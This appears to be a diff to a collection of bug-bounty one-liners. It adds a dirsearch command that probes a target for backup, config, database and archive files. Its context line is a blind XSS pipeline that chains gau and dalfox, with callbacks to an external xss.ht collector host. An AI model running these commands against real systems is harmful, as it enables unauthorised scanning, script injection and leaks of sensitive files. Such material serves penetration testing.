@@ -11,3 +11,7 @@
 # Blind XSS Oneliner:
 
 `echo testphp.vulnweb.com|gau -subs|grep "https://" |grep -v "png\|jpg\|css\|js\|gif\|txt"|grep "="|uro|dalfox pipe --deep-domxss --multicast --blind akshayravi0479.xss.ht`
+
+# Content Discovery With Dirsearch Oneliner:
+
+`dirsearch -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,log,xml,js,json -u http://target`
